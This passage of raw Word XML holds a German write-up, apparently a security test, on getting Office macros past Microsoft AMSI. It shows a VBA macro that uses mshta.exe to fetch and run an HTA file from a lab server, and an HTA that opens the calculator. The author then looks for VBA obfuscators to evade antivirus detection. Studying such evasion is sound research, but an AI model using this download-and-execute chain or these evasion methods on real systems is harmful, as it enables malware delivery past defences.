        <w:t>eingestuft</w:t>
      </w:r>
      <w:r w:rsidR="00542D9F">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> sind,</w:t>
      </w:r>
      <w:r w:rsidR="00681FB0">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00DB3FD4">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">beobachtet werden, wird die Makroausführung angehalten und der Inhalt </w:t>
      </w:r>
      <w:r w:rsidR="002D6EF0" w:rsidRPr="00DB3FD4">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">des </w:t>
      </w:r>
      <w:r w:rsidR="002D6EF0">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>zirkulären Speichers</w:t>
      </w:r>
      <w:r w:rsidR="006C2AC1">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00DB3FD4">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>an AMSI übergeben.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="718F2DCC" w14:textId="2B1CC192" w:rsidR="00DB3FD4" w:rsidRPr="00DB3FD4" w:rsidRDefault="00DB3FD4" w:rsidP="00DB3FD4">
      <w:pPr>
        <w:pStyle w:val="Listenabsatz"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="43"/>
        </w:numPr>
        <w:ind w:left="284" w:hanging="284"/>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DB3FD4">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Der registrierte AMSI</w:t>
      </w:r>
      <w:r w:rsidR="00971636">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00DB3FD4">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Anti-Malware-Dienstanbieter antwortet </w:t>
      </w:r>
      <w:r w:rsidR="002D6EF0" w:rsidRPr="00DB3FD4">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>mit einer Response</w:t>
      </w:r>
      <w:r w:rsidRPr="00DB3FD4">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidR="00971636">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>welche</w:t>
      </w:r>
      <w:r w:rsidR="0023593A">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r w:rsidRPr="00DB3FD4">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> angibt, ob das Makroverhalten bösartig ist oder nicht.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CDCE878" w14:textId="42D0008E" w:rsidR="00DB3FD4" w:rsidRPr="00DB3FD4" w:rsidRDefault="00971636" w:rsidP="00DB3FD4">
      <w:pPr>
        <w:pStyle w:val="Listenabsatz"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="43"/>
        </w:numPr>
        <w:ind w:left="284" w:hanging="284"/>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Sollte das</w:t>
      </w:r>
      <w:r w:rsidR="00DB3FD4" w:rsidRPr="00DB3FD4">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Verhalten </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">als </w:t>
      </w:r>
      <w:r w:rsidR="00DB3FD4" w:rsidRPr="00DB3FD4">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">nicht bösartig </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>eingestuft worden sein</w:t>
      </w:r>
      <w:r w:rsidR="00DB3FD4" w:rsidRPr="00DB3FD4">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>, wird die Makroausführung fortgesetzt.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="123BEBBE" w14:textId="234CA0FF" w:rsidR="00BF5761" w:rsidRPr="00971636" w:rsidRDefault="00971636" w:rsidP="008E5847">
      <w:pPr>
        <w:pStyle w:val="Listenabsatz"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="43"/>
        </w:numPr>
        <w:ind w:left="284" w:hanging="284"/>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Ansonsten </w:t>
      </w:r>
      <w:r w:rsidR="00DB3FD4" w:rsidRPr="00DB3FD4">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">schließt Microsoft Office die Sitzung und </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>der Antivirus</w:t>
      </w:r>
      <w:r w:rsidR="00DB3FD4" w:rsidRPr="00DB3FD4">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> kann die Datei in Quarantäne stellen.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F22D9E3" w14:textId="2C8E62EE" w:rsidR="008E5847" w:rsidRDefault="00D60194" w:rsidP="008E5847">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Ich </w:t>
      </w:r>
      <w:r w:rsidR="00B47CB9" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">startete </w:t>
      </w:r>
      <w:r w:rsidR="00881211">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">mit HTA’s. Innerhalb der </w:t>
      </w:r>
      <w:r w:rsidR="000179D9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Excel Datei verwies ich mit einem Button auf </w:t>
      </w:r>
      <w:r w:rsidR="00E2115A">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">eine </w:t>
      </w:r>
      <w:r w:rsidR="008E5847">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>VBA Funktion, welche folgenden Code beinhaltete:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21A40D7C" w14:textId="77777777" w:rsidR="008E5847" w:rsidRDefault="008E5847" w:rsidP="008E5847">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tabellenraster"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9060"/>
      </w:tblGrid>
      <w:tr w:rsidR="008E5847" w:rsidRPr="00866A18" w14:paraId="3BB837AD" w14:textId="77777777" w:rsidTr="008E5847">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9060" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1B869FDC" w14:textId="77777777" w:rsidR="008E5847" w:rsidRPr="00866A18" w:rsidRDefault="008E5847" w:rsidP="008E5847">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00866A18">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>Sub FünftesMakro()</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="16AF8002" w14:textId="77777777" w:rsidR="008E5847" w:rsidRPr="00866A18" w:rsidRDefault="008E5847" w:rsidP="008E5847">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="65CE9255" w14:textId="77777777" w:rsidR="008E5847" w:rsidRPr="00866A18" w:rsidRDefault="008E5847" w:rsidP="008E5847">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00866A18">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>Dim cmd As String</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="40D0BD44" w14:textId="77777777" w:rsidR="008E5847" w:rsidRPr="00866A18" w:rsidRDefault="008E5847" w:rsidP="008E5847">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00866A18">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>Dim ws As Object</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="22F9B33F" w14:textId="77777777" w:rsidR="008E5847" w:rsidRPr="00866A18" w:rsidRDefault="008E5847" w:rsidP="008E5847">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="605E2DAF" w14:textId="77777777" w:rsidR="008E5847" w:rsidRPr="00597C53" w:rsidRDefault="008E5847" w:rsidP="008E5847">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00866A18">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t xml:space="preserve">cmd1 = "cmd /c start %windir%\syswow64\mshta.exe </w:t>
            </w:r>
            <w:r w:rsidRPr="00597C53">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>http://10.0.2.11:8000/test1.hta"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="180B7C73" w14:textId="77777777" w:rsidR="008E5847" w:rsidRPr="00597C53" w:rsidRDefault="008E5847" w:rsidP="008E5847">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="0BB21482" w14:textId="77777777" w:rsidR="008E5847" w:rsidRPr="00597C53" w:rsidRDefault="008E5847" w:rsidP="008E5847">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00597C53">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>Set ws = CreateObject("WScript.Shell")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="49C972B4" w14:textId="77777777" w:rsidR="008E5847" w:rsidRPr="00597C53" w:rsidRDefault="008E5847" w:rsidP="008E5847">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00597C53">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>ws.Exec (cmd1)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="50423510" w14:textId="77777777" w:rsidR="008E5847" w:rsidRPr="00597C53" w:rsidRDefault="008E5847" w:rsidP="008E5847">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="663C8B48" w14:textId="16FA8034" w:rsidR="008E5847" w:rsidRPr="00597C53" w:rsidRDefault="008E5847" w:rsidP="008E5847">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00597C53">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>End Sub</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="74F1AC47" w14:textId="5AC11771" w:rsidR="00524B72" w:rsidRPr="00597C53" w:rsidRDefault="00524B72" w:rsidP="001770D6">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-NZ"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3CAD3E7D" w14:textId="0916ABAE" w:rsidR="00445F0A" w:rsidRDefault="00445F0A" w:rsidP="001770D6">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Dieses startet die HTA Datei </w:t>
      </w:r>
      <w:r w:rsidR="001935FF">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">mit </w:t>
      </w:r>
      <w:r w:rsidR="001935FF" w:rsidRPr="001935FF">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>mshta.exe</w:t>
      </w:r>
      <w:r w:rsidR="001935FF">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">, welches zuvor </w:t>
      </w:r>
      <w:r w:rsidR="00C90D65">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>mithilfe von „python -m Si</w:t>
      </w:r>
      <w:r w:rsidR="009271F6">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>mpleHttpSever“ zur Verfügung stellt.</w:t>
      </w:r>
      <w:r w:rsidR="007314CB">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> D</w:t>
      </w:r>
      <w:r w:rsidR="00D61AE2">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">ie HTA </w:t>
      </w:r>
      <w:r w:rsidR="007314CB">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Datei </w:t>
      </w:r>
      <w:r w:rsidR="00D61AE2">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>hatte folgenden Inhalt und sollte mit CMD einen</w:t>
      </w:r>
      <w:r w:rsidR="002015B6">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Rechner öffnen.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="447F1F65" w14:textId="5BE4406E" w:rsidR="00D61AE2" w:rsidRDefault="00D61AE2" w:rsidP="001770D6">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tabellenraster"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9060"/>
      </w:tblGrid>
      <w:tr w:rsidR="00D61AE2" w14:paraId="0EEFD17B" w14:textId="77777777" w:rsidTr="00D61AE2">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9060" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="19ED974A" w14:textId="77777777" w:rsidR="00D61AE2" w:rsidRPr="00597C53" w:rsidRDefault="00D61AE2" w:rsidP="00D61AE2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00597C53">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>&lt;html&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4AD1AEB9" w14:textId="77777777" w:rsidR="00D61AE2" w:rsidRPr="00597C53" w:rsidRDefault="00D61AE2" w:rsidP="00D61AE2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00597C53">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>&lt;head&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6928DBED" w14:textId="77777777" w:rsidR="00D61AE2" w:rsidRPr="00597C53" w:rsidRDefault="00D61AE2" w:rsidP="00D61AE2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00597C53">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>&lt;HTA:APPLICATION ID="HelloExample"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5F8A0271" w14:textId="77777777" w:rsidR="00D61AE2" w:rsidRPr="00597C53" w:rsidRDefault="00D61AE2" w:rsidP="00D61AE2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00597C53">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>&lt;script language="jscript"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4C8C7FBE" w14:textId="77777777" w:rsidR="00D61AE2" w:rsidRPr="00597C53" w:rsidRDefault="00D61AE2" w:rsidP="00D61AE2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00597C53">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        var c = "cmd.exe /c calc.exe"; </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="450D7BEF" w14:textId="77777777" w:rsidR="00D61AE2" w:rsidRPr="00597C53" w:rsidRDefault="00D61AE2" w:rsidP="00D61AE2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00597C53">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        new ActiveXObject('WScript.Shell').Run(c);</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3158467C" w14:textId="77777777" w:rsidR="00D61AE2" w:rsidRPr="00597C53" w:rsidRDefault="00D61AE2" w:rsidP="00D61AE2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00597C53">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>&lt;/script&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2294C18A" w14:textId="77777777" w:rsidR="00D61AE2" w:rsidRPr="00597C53" w:rsidRDefault="00D61AE2" w:rsidP="00D61AE2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00597C53">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>&lt;/head&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3FD19157" w14:textId="77777777" w:rsidR="00D61AE2" w:rsidRPr="00597C53" w:rsidRDefault="00D61AE2" w:rsidP="00D61AE2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00597C53">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>&lt;body&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="65C19803" w14:textId="77777777" w:rsidR="00D61AE2" w:rsidRPr="00597C53" w:rsidRDefault="00D61AE2" w:rsidP="00D61AE2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00597C53">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>&lt;script&gt;self.close();&lt;/script&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4EF18A06" w14:textId="77777777" w:rsidR="00D61AE2" w:rsidRPr="00D61AE2" w:rsidRDefault="00D61AE2" w:rsidP="00D61AE2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00D61AE2">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>&lt;/body&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7E7CA5C1" w14:textId="2348E757" w:rsidR="00D61AE2" w:rsidRDefault="00D61AE2" w:rsidP="00D61AE2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00D61AE2">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>&lt;/html&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5E889486" w14:textId="77777777" w:rsidR="00D61AE2" w:rsidRDefault="00D61AE2" w:rsidP="001770D6">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="683740AE" w14:textId="275F5A5B" w:rsidR="00D61AE2" w:rsidRDefault="002E2C39" w:rsidP="001770D6">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Das </w:t>
      </w:r>
      <w:r w:rsidR="0023593A">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">unktionierte bei deaktiviertem Antivirus natürlich gut, sobald ich </w:t>
      </w:r>
      <w:r w:rsidR="00985ACD">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">jedoch diesen aktivierte </w:t>
      </w:r>
      <w:r w:rsidR="0023593A">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r w:rsidR="00985ACD">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">eldete sich AMSI. </w:t>
      </w:r>
      <w:r w:rsidR="00C83A89">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Also </w:t>
      </w:r>
      <w:r w:rsidR="007D797B">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>dachte</w:t>
      </w:r>
      <w:r w:rsidR="00C83A89">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> ich,</w:t>
      </w:r>
      <w:r w:rsidR="003E30DB">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> dass</w:t>
      </w:r>
      <w:r w:rsidR="007D797B">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> ich</w:t>
      </w:r>
      <w:r w:rsidR="003E30DB">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> sowieso auch für weitere Testversuche eine Obfuskierung brauchen würde. </w:t>
      </w:r>
      <w:r w:rsidR="00173456">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Also warf ich die Suchmaschine meines Vertrauens an und suchte nach einem VBA Ob</w:t>
      </w:r>
      <w:r w:rsidR="00144E7C">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">fuskator. Ich probierte unterschiedliche aus und wurde größtenteils </w:t>
      </w:r>
      <w:r w:rsidR="000F5F26">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">aus verschiedenen Gründen enttäuscht (Code wird nur </w:t>
      </w:r>
      <w:r w:rsidR="00B440C5">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>vereinzelt</w:t>
      </w:r>
      <w:r w:rsidR="000F5F26">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00B440C5">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>obfuskiert</w:t>
      </w:r>
      <w:r w:rsidR="000F5F26">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>, Tools funktioniert nicht, Code lässt sich nach der Ob</w:t>
      </w:r>
      <w:r w:rsidR="00D8226F">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>fuskierung nicht ausführen …)</w:t>
      </w:r>
      <w:r w:rsidR="00144E7C">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71327BD0" w14:textId="38C4C9C2" w:rsidR="00144E7C" w:rsidRDefault="00144E7C" w:rsidP="001770D6">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="707CE03B" w14:textId="66F68BB1" w:rsidR="00144E7C" w:rsidRPr="00BC2A48" w:rsidRDefault="00144E7C" w:rsidP="00BC2A48">
      <w:pPr>
        <w:pStyle w:val="Listenabsatz"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BC2A48">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>https://github.com/ch4meleon/vba_obfuscator</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D55851C" w14:textId="2A6F2861" w:rsidR="00D61AE2" w:rsidRPr="00BC2A48" w:rsidRDefault="00DE67E4" w:rsidP="00BC2A48">
      <w:pPr>
        <w:pStyle w:val="Listenabsatz"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId23" w:history="1">
        <w:r w:rsidR="00BC2A48" w:rsidRPr="00BC2A48">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="de-AT"/>
          </w:rPr>
          <w:t>https://www.excel-pratique.com/en/vba_tricks/vba-obfuscator</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="56DAD7F1" w14:textId="5D86DCEC" w:rsidR="00BC2A48" w:rsidRPr="00BC2A48" w:rsidRDefault="00BC2A48" w:rsidP="00BC2A48">
      <w:pPr>
        <w:pStyle w:val="Listenabsatz"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BC2A48">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>https://github.com/bonnetn/vba-obfuscator</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7405E612" w14:textId="2B3C2F9B" w:rsidR="00445F0A" w:rsidRDefault="00445F0A" w:rsidP="001770D6">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3EFB0774" w14:textId="12097B24" w:rsidR="00BC2A48" w:rsidRDefault="00BC2A48" w:rsidP="001770D6">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Wirklich überzeugen konnte mich </w:t>
      </w:r>
      <w:r w:rsidR="00A47C33">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">nur </w:t>
      </w:r>
      <w:r w:rsidR="00A47C33" w:rsidRPr="00A47C33">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Macro Pack</w:t>
